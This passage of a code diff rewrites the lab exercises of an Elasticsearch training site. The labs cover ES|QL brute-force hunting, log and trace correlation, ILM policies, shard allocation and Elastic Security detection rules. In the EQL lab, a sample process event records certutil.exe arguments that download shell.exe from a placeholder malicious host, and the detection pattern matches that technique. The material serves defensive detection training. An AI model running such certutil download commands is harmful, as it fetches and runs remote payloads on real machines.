-    <span class="k">"discounted_price"</span>: [<span class="n">799.99</span>],
-    <span class="k">"savings"</span>:          [<span class="n">200.00</span>]
-  }
-}</div></div>
-<p><strong>Why?</strong> Script fields allow you to compute "virtual" fields on the fly at search time without modifying the stored data on disk.</p>`, "advanced"]
+<p><strong>Why?</strong> Plugins extend core features. Specialized plugins like <code>analysis-icu</code> are essential for high-quality multilingual search, such as proper word tokenization for character-heavy languages like Japanese or Chinese.</p>`, "intermediate"]
       ],
 
       m7: [
-        ["Security Threat Hunting: Detect a Brute Force Attack",
-          `<p><strong>Step 1:</strong> Create log ingest pipeline to track timestamps</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _ingest/pipeline/auth_logs_pipeline
-{
-  <span class="k">"description"</span>: <span class="s">"Pipeline for authentication logs"</span>,
-  <span class="k">"processors"</span>: [
-    {
-      <span class="k">"set"</span>: { <span class="k">"field"</span>: <span class="s">"event.ingested"</span>, <span class="k">"value"</span>: <span class="s">"{{_ingest.timestamp}}"</span> }
-    }
-  ]
-}</div></div>
-<p><strong>Step 2:</strong> Ingest dummy authentication data</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST auth-logs/_bulk?pipeline=auth_logs_pipeline
+        ["Lab 22: Security Threat Hunting: ES|QL for Brute Force",
+          `<p><strong>Step 1:</strong> Ingest sample authentication logs.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST auth-logs/_bulk
 {"index":{}}
-{"@timestamp":"2024-10-25T10:00:01Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"action":"login","outcome":"failure"}}
+{"@timestamp":"2024-11-01T10:00:01Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"outcome":"failure"}}
 {"index":{}}
-{"@timestamp":"2024-10-25T10:00:03Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"action":"login","outcome":"failure"}}
+{"@timestamp":"2024-11-01T10:00:02Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"outcome":"failure"}}
 {"index":{}}
-{"@timestamp":"2024-10-25T10:00:05Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"action":"login","outcome":"failure"}}
+{"@timestamp":"2024-11-01T10:00:03Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"outcome":"failure"}}
 {"index":{}}
-{"@timestamp":"2024-10-25T10:00:07Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"action":"login","outcome":"failure"}}
-{"index":{}}
-{"@timestamp":"2024-10-25T10:00:10Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"action":"login","outcome":"success"}}
-{"index":{}}
-{"@timestamp":"2024-10-25T10:05:00Z","source":{"ip":"10.0.0.50"},"user":{"name":"jdoe"},"event":{"action":"login","outcome":"success"}}</div></div>
-<p><strong>Step 3:</strong> Detect Brute Force using ES|QL</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_query?format=txt
-{
-  <span class="k">"query"</span>: <span class="s">"""
-    FROM auth-logs
-    | WHERE event.action == "login" AND event.outcome == "failure"
-    | STATS failed_attempts = COUNT(event.outcome) BY source.ip, user.name
-    | WHERE failed_attempts > 3
-    | SORT failed_attempts DESC
-  """</span>
-}</div></div>`, "advanced"],
+{"@timestamp":"2024-11-01T10:00:04Z","source":{"ip":"192.168.1.100"},"user":{"name":"admin"},"event":{"outcome":"failure"}}</div></div>
+<p><strong>Step 2:</strong> Detect Brute Force using ES|QL.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">FROM auth-logs
+| WHERE event.outcome == "failure"
+| STATS failed = COUNT(*) BY source.ip, user.name
+| WHERE failed > 3</div></div>
+<p><strong>Why?</strong> ES|QL makes threat hunting intuitive. Comparing failed attempts with a simple <code>STATS ... BY</code> pipe is far easier than deeply nested aggregations in Query DSL.</p>`, "advanced"],
 
-        ["Application Debugging: Identify Slow Transactions",
-          `<p><strong>Step 1:</strong> Setup schemas for APM Traces and App Logs</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT app-logs
-{
-  <span class="k">"mappings"</span>: {
-    <span class="k">"properties"</span>: {
-      <span class="k">"@timestamp"</span>: { <span class="k">"type"</span>: <span class="s">"date"</span> },
-      <span class="k">"trace.id"</span>: { <span class="k">"type"</span>: <span class="s">"keyword"</span> },
-      <span class="k">"message"</span>: { <span class="k">"type"</span>: <span class="s">"text"</span> },
-      <span class="k">"log.level"</span>: { <span class="k">"type"</span>: <span class="s">"keyword"</span> }
-    }
-  }
-}
-
-PUT apm-traces
-{
-  <span class="k">"mappings"</span>: {
-    <span class="k">"properties"</span>: {
-      <span class="k">"@timestamp"</span>: { <span class="k">"type"</span>: <span class="s">"date"</span> },
-      <span class="k">"trace.id"</span>: { <span class="k">"type"</span>: <span class="s">"keyword"</span> },
-      <span class="k">"transaction.duration.us"</span>: { <span class="k">"type"</span>: <span class="s">"long"</span> },
-      <span class="k">"transaction.name"</span>: { <span class="k">"type"</span>: <span class="s">"keyword"</span> },
-      <span class="k">"transaction.result"</span>: { <span class="k">"type"</span>: <span class="s">"keyword"</span> }
-    }
-  }
-}</div></div>
-<p><strong>Step 2:</strong> Ingest Dummy Data</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _bulk
-{"index":{"_index":"apm-traces"}}
-{"@timestamp":"2024-10-25T11:00:00Z", "trace.id":"trace-123", "transaction.name":"GET /api/users", "transaction.duration.us": 15000, "transaction.result":"HTTP 2xx"}
-{"index":{"_index":"app-logs"}}
-{"@timestamp":"2024-10-25T11:00:00Z", "trace.id":"trace-123", "log.level":"INFO", "message":"Fetching user profile"}
-{"index":{"_index":"apm-traces"}}
-{"@timestamp":"2024-10-25T11:05:00Z", "trace.id":"trace-456", "transaction.name":"POST /api/checkout", "transaction.duration.us": 8500000, "transaction.result":"HTTP 5xx"}
-{"index":{"_index":"app-logs"}}
-{"@timestamp":"2024-10-25T11:05:01Z", "trace.id":"trace-456", "log.level":"ERROR", "message":"Database connection timeout"}
-{"index":{"_index":"app-logs"}}
-{"@timestamp":"2024-10-25T11:05:05Z", "trace.id":"trace-456", "log.level":"FATAL", "message":"Unhandled RuntimeException: Null pointer during checkout phase"}</div></div>
-<p><strong>Step 3:</strong> Search APM Traces for long duration calls (>5 seconds)</p>
+        ["Lab 23: Application Debugging: Correlating Logs & Traces",
+          `<p><strong>Step 1:</strong> Search for slow transactions (>5s) in APM traces.</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET apm-traces/_search
 {
-  <span class="k">"_source"</span>: [<span class="s">"trace.id"</span>, <span class="s">"transaction.name"</span>, <span class="s">"transaction.duration.us"</span>],
-  <span class="k">"query"</span>: {
-    <span class="k">"range"</span>: { <span class="k">"transaction.duration.us"</span>: { <span class="k">"gt"</span>: <span class="n">5000000</span> } }
-  }
+  "query": { "range": { "transaction.duration.us": { "gt": 5000000 } } }
 }</div></div>
-<p><strong>Step 4:</strong> Correlate the returned <code>trace-456</code> ID with application logs</p>
+<p><strong>Step 2:</strong> Correlate with logs using the returned <code>trace.id</code>.</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET app-logs/_search
-{
-  <span class="k">"query"</span>: { <span class="k">"term"</span>: { <span class="k">"trace.id"</span>: <span class="s">"trace-456"</span> } },
-  <span class="k">"sort"</span>: [ { <span class="k">"@timestamp"</span>: <span class="s">"asc"</span> } ]
-}</div></div>`, "advanced"],
+{ "query": { "term": { "trace.id": "trace-456" } } }</div></div>
+<p><strong>Why?</strong> Correlating logs with traces allows you to see the exact error message that caused a slow transaction, significantly reducing the Mean Time to Repair (MTTR).</p>`, "advanced"],
 
-        ["Day 2 Ops: High CPU and Profile API",
-          `<p><strong>Step 1:</strong> Identify what the CPU is actually doing</p>
+        ["Lab 24: Performance Troubleshooting: hot_threads & Profile API",
+          `<p><strong>Step 1:</strong> Identify high CPU usage tasks.</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _nodes/hot_threads?threads=3</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">Hot Threads Output Meanings:
-- Lucene.search = High Search Load
-- index/write/merge = High Indexing Pressure
-- GC = JVM Heap exhaustion</div></div>
-<p><strong>Step 2:</strong> Use the Task Management API to find un-optimized running operations</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _tasks?detailed=true&actions=*search*</div></div>
-<p><strong>Step 3:</strong> Measure the severe cost of leading wildcard searches using the Profile API</p>
+<p><strong>Step 2:</strong> Profile a suspicious wildcard query.</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _search
 {
-  <span class="k">"profile"</span>: <span class="n">true</span>,
-  <span class="k">"query"</span>: {
-    <span class="k">"wildcard"</span>: {
-      <span class="k">"message"</span>: {
-        <span class="k">"value"</span>: <span class="s">"*search*"</span>
-      }
+  "profile": true,
+  "query": { "wildcard": { "message": "*search*" } }
+}</div></div>
+<p><strong>Why?</strong> The hot_threads API helps you see what the CPU is actually doing (e.g., searching vs indexing). The Profile API helps you quantify the high cost of unoptimized queries like leading wildcards.</p>`, "advanced"],
+
+        ["Lab 25: Advanced Data Lifecycle: Hot-Warm-Cold with ILM",
+          `<p><strong>Step 1:</strong> Create a Hot-Warm-Delete ILM policy.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _ilm/policy/tiered_policy
+{
+  "policy": {
+    "phases": {
+      "hot": { "actions": { "rollover": { "max_age": "1d" } } },
+      "warm": { "min_age": "2d", "actions": { "shrink": { "number_of_shards": 1 } } },
+      "delete": { "min_age": "30d", "actions": { "delete": {} } }
     }
   }
 }</div></div>
-<p><span class="lb lb-t">TIP</span> Look closely at the nanoseconds breakdown for <code>MultiTermQueryConstantScoreWrapper</code> in the profile response.</p>`, "advanced"],
+<p><strong>Why?</strong> A tiered storage architecture (Hot-Warm-Cold) allows you to keep old data on cheaper, slower hardware while ensuring new data is indexed and searched on high-performance SSDs.</p>`, "advanced"],
 
-        ["Day 2 Ops: Robust Index Lifecycle Management",
-          `<p><strong>Step 1:</strong> Define Advanced ILM Policy (Hot, Warm, Cold, Delete)</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _ilm/policy/advanced_logs_policy
-{
-  <span class="k">"policy"</span>: {
-    <span class="k">"phases"</span>: {
-      <span class="k">"hot"</span>: { <span class="k">"actions"</span>: { <span class="k">"rollover"</span>: { <span class="k">"max_primary_shard_size"</span>: <span class="s">"50gb"</span>, <span class="k">"max_age"</span>: <span class="s">"1d"</span> } } },
-      <span class="k">"warm"</span>: {
-        <span class="k">"min_age"</span>: <span class="s">"2d"</span>,
-        <span class="k">"actions"</span>: {
-          <span class="k">"shrink"</span>: { <span class="k">"number_of_shards"</span>: <span class="n">1</span> },
-          <span class="k">"forcemerge"</span>: { <span class="k">"max_num_segments"</span>: <span class="n">1</span> }
-        }
-      },
-      <span class="k">"cold"</span>: { <span class="k">"min_age"</span>: <span class="s">"7d"</span>, <span class="k">"actions"</span>: { <span class="k">"set_priority"</span>: { <span class="k">"priority"</span>: <span class="n">0</span> } } },
-      <span class="k">"delete"</span>: { <span class="k">"min_age"</span>: <span class="s">"30d"</span>, <span class="k">"actions"</span>: { <span class="k">"delete"</span>: {} } }
-    }
-  }
-}</div></div>
-<p><strong>Step 2:</strong> Link Policy Using an Index Template</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _index_template/logs_template
-{
-  <span class="k">"index_patterns"</span>: [<span class="s">"syslogs-*"</span>],
-  <span class="k">"template"</span>: {
-    <span class="k">"settings"</span>: {
-      <span class="k">"number_of_shards"</span>: <span class="n">2</span>,
-      <span class="k">"number_of_replicas"</span>: <span class="n">1</span>,
-      <span class="k">"index.lifecycle.name"</span>: <span class="s">"advanced_logs_policy"</span>,
-      <span class="k">"index.lifecycle.rollover_alias"</span>: <span class="s">"syslogs"</span>
-    }
-  }
-}</div></div>
-<p><strong>Step 3:</strong> Bootstrap the Writing Index and check status</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT syslogs-000001
-{
-  <span class="k">"aliases"</span>: { <span class="k">"syslogs"</span>: { <span class="k">"is_write_index"</span>: <span class="n">true</span> } }
-}
+        ["Lab 26: Cluster Resilience: Shard Allocation & Rolling Restarts",
+          `<p><strong>Step 1:</strong> Diagnose a stuck shard.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _cluster/allocation/explain</div></div>
+<p><strong>Step 2:</strong> Maintenance rule: Disable allocation before node restart.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _cluster/settings
+{ "persistent": { "cluster.routing.allocation.enable": "none" } }</div></div>
+<p><strong>Why?</strong> Disabling shard allocation prevents the cluster from trying to balance data while a node is temporarily offline, avoiding unnecessary stressful IO during maintenance.</p>`, "advanced"],
 
-GET syslogs-000001/_ilm/explain</div></div>`, "intermediate"],
-
-        ["Day 2 Ops: Advanced Cluster Resilience",
-          `<p><strong>Step 1:</strong> Simulate an impossible routing condition</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT resilient-index
-{
-  <span class="k">"settings"</span>: {
-    <span class="k">"number_of_shards"</span>: <span class="n">1</span>,
-    <span class="k">"number_of_replicas"</span>: <span class="n">0</span>,
-    <span class="k">"index.routing.allocation.require.storage"</span>: <span class="s">"high_io"</span>
-  }
-}</div></div>
-<p><strong>Step 2:</strong> Diagnose the stuck Shard Allocation</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _cluster/allocation/explain
-{
-  <span class="k">"index"</span>: <span class="s">"resilient-index"</span>,
-  <span class="k">"shard"</span>: <span class="n">0</span>,
-  <span class="k">"primary"</span>: <span class="n">true</span>
-}</div></div>
-<p><span class="lb lb-t">TIP</span> Look at the <code>deciders</code> array, we will see <code>node_match</code> returning <code>NO</code> since we have no high_io nodes.</p>
-<p><strong>Step 3:</strong> Remove the impossible requirement</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT resilient-index/_settings
-{
-  <span class="k">"index.routing.allocation.require.storage"</span>: <span class="n">null</span>
-}</div></div>
-<p><strong>Step 4:</strong> The Golden Rule for Node Restarts / Maintenenace</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j"><span class="c">// BEFORE stopping the daemon on ANY node:</span>
-PUT _cluster/settings
-{ <span class="k">"persistent"</span>: { <span class="k">"cluster.routing.allocation.enable"</span>: <span class="s">"none"</span> } }
-
-<span class="c">// AFTER the node has booted back up and joined the cluster:</span>
-PUT _cluster/settings
-{ <span class="k">"persistent"</span>: { <span class="k">"cluster.routing.allocation.enable"</span>: <span class="s">"all"</span> } }</div></div>`, "advanced"],
-        ["Brute Force Detection: Threshold Rules",
-          `<p><strong>Step 1:</strong> Navigate to <strong>Security</strong> > <strong>Rules</strong> and create a <strong>Threshold</strong> rule.</p>
-<p><strong>Step 2:</strong> Set the KQL query:</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">event.category : "authentication" AND event.outcome : "failure"</div></div>
-<p><strong>Step 3:</strong> Group by <code>source.ip</code>, Count > 10, Window 5m.</p>
-<p><strong>Step 4:</strong> Ingest test data (Run this bulk command in Dev Tools):</p>
+        ["Lab 27: Brute Force Detection (Threshold Rules)",
+          `<p><strong>Step 1:</strong> Create a <strong>Threshold</strong> rule in <strong>Security</strong> > <strong>Rules</strong>.</p>
+<p><strong>Step 2:</strong> Ingest test data (Run this bulk command in Dev Tools):</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_bulk
 { "index" : { "_index" : "logs-system.auth-default" } }
 { "@timestamp": "2026-03-04T10:00:00Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
@@ -1202,61 +1000,44 @@ PUT _cluster/settings
 { "@timestamp": "2026-03-04T10:00:50Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }
 { "index" : { "_index" : "logs-system.auth-default" } }
 { "@timestamp": "2026-03-04T10:00:55Z", "event.category": "authentication", "event.outcome": "failure", "source.ip": "192.168.1.50", "user.name": "admin" }</div></div>
-<p><span class="lb lb-t">EXPECTED</span> Alert flyout shows: "12 events triggered the threshold of 10" for Source IP 192.168.1.50.</p>`, "advanced"],
+<p><span class="lb lb-t">EXPECTED</span> Alert flyout shows: "12 events triggered the threshold of 10" for Source IP 192.168.1.50.</p>
+<p><strong>Why?</strong> Threshold rules allow you to detect high-frequency attacks that are otherwise hidden in common logs. It automates the "wait and watch" process for specific event patterns.</p>`, "advanced"],
 
-        ["Suspicious Process: EQL Correlation",
+        ["Lab 28: Suspicious Process (EQL Correlation)",
           `<p><strong>Step 1:</strong> Create an <strong>Event Correlation (EQL)</strong> rule.</p>
-<p><strong>Step 2:</strong> Set the EQL query:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">process where process.name == "certutil.exe" and 
 process.args : ("*urlcache*", "*split*", "*download*")</div></div>
-<p><strong>Step 3:</strong> Ingest sample endpoint event:</p>
+<p><strong>Step 2:</strong> Ingest sample endpoint event:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-endpoint.events.process-default/_doc
 {
-  <span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:05:00Z"</span>,
-  <span class="k">"process.name"</span>: <span class="s">"certutil.exe"</span>,
-  <span class="k">"process.args"</span>: [<span class="s">"-urlcache"</span>, <span class="s">"-split"</span>, <span class="s">"-f"</span>, <span class="s">"http://malicious-site.com/shell.exe"</span>],
-  <span class="k">"host.name"</span>: <span class="s">"HR-Laptop-01"</span>,
-  <span class="k">"user.name"</span>: <span class="s">"jdoe"</span>
+  "@timestamp": "2026-03-04T10:05:00Z",
+  "process.name": "certutil.exe",
+  "process.args": ["-urlcache", "-split", "-f", "http://malicious.com/shell.exe"],
+  "host.name": "HR-Laptop-01",
+  "user.name": "jdoe"
 }</div></div>
-<p><span class="lb lb-t">EXPECTED</span> Alert "Suspicious Certutil Download" shows user: "jdoe", host: "HR-Laptop-01", and the EQL match.</p>`, "advanced"],
+<p><strong>Why?</strong> EQL is designed specifically for event correlation, allowing you to find complex attack chains (like a process starting another) with minimal syntax.</p>`, "advanced"],
 
-        ["Data Exfiltration: ES|QL Detection",
+        ["Lab 29: Data Exfiltration (ES|QL Detection)",
           `<p><strong>Step 1:</strong> Create an <strong>ES|QL</strong> rule.</p>
-<p><strong>Step 2:</strong> Set the ES|QL query:</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">FROM logs-network*
 | STATS total_bytes = SUM(destination.bytes) BY source.ip, user.name
 | WHERE total_bytes > 500000000
 | SORT total_bytes DESC</div></div>
-<p><strong>Step 3:</strong> Ingest high-volume network event:</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-network-default/_doc
-{
-  <span class="k">"@timestamp"</span>: <span class="s">"2026-03-04T10:10:00Z"</span>,
-  <span class="k">"source.ip"</span>: <span class="s">"10.0.0.5"</span>,
-  <span class="k">"user.name"</span>: <span class="s">"v.kumar"</span>,
-  <span class="k">"destination.bytes"</span>: <span class="n">600000000</span>,
-  <span class="k">"destination.ip"</span>: <span class="s">"203.0.113.10"</span>
-}</div></div>
-<p><span class="lb lb-t">EXPECTED</span> ES|QL Result table flags user "v.kumar" with exactly 600,000,000 bytes.</p>`, "advanced"],
+<p><strong>Why?</strong> The new ES|QL rule type allows for powerful aggregations and mathematical comparisons within a single detection rule, simplifying the logic for data exfiltration detection.</p>`, "advanced"],
 
-        ["Anomaly Detection: Machine Learning Rules",
-          `<p><strong>Step 1:</strong> Create an ML Job (<strong>Machine Learning</strong> > <strong>Anomaly Detection</strong>).</p>
-<p><strong>Step 2:</strong> Use <code>rare</code> detector on <code>source.geo.country_iso_code</code>.</p>
-<p><strong>Step 3:</strong> Ingest baseline behavior (US) then anomaly (CN):</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_bulk
-{ "index" : { "_index" : "logs-rare-logins" } }
-{ "@timestamp": "2026-03-04T08:00:00Z", "user.name": "alice", "source.geo.country_iso_code": "US" }
-{ "index" : { "_index" : "logs-rare-logins" } }
-{ "@timestamp": "2026-03-04T08:05:00Z", "user.name": "alice", "source.geo.country_iso_code": "US" }
-
-POST /logs-rare-logins/_doc
+        ["Lab 30: Anomaly Detection (Machine Learning Rules)",
+          `<p><strong>Step 1:</strong> Create an ML Job for <code>rare</code> country logins.</p>
+<p><strong>Step 2:</strong> Create a Security Rule linking to this ML Job.</p>
+<p><strong>Step 3:</strong> Ingest anomalous data:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /logs-rare-logins/_doc
 { "@timestamp": "2026-03-04T10:00:00Z", "user.name": "alice", "source.geo.country_iso_code": "CN" }</div></div>
-<p><strong>Step 4:</strong> Create a Security Rule linking to this ML Job.</p>
-<p><span class="lb lb-t">EXPECTED</span> Security Alert shows "Critical" anomaly for user "alice" with an anomaly score matching the rare CN login.</p>`, "advanced"],
+<p><strong>Why?</strong> Machine Learning excels at finding "unknown unknowns" — behavior that is statistically unusual even if it doesn't violate a static threshold rule.</p>`, "advanced"],
 
-        ["Bulk Install Prebuilt Rules: Security API",
-          `<p><strong>Step 1:</strong> Run installation API in Dev Tools:</p>
+        ["Lab 31: Bulk Install Prebuilt Rules (Security API)",
+          `<p><strong>Step 1:</strong> Run installation API in Dev Tools.</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT /api/detection_engine/rules/prebuilt</div></div>
-<p><span class="lb lb-t">EXPECTED</span> API Response: { "rules_installed": 842, ... }. Security Rules UI now shows hundreds of Elastic prebuilt rules.</p>`, "advanced"]
+<p><strong>Why?</strong> Installing prebuilt rules gives you instant access to hundreds of detection patterns researched by Elastic's security team, saving weeks of manual rule creation.</p>`, "advanced"]
       ]
     };
 
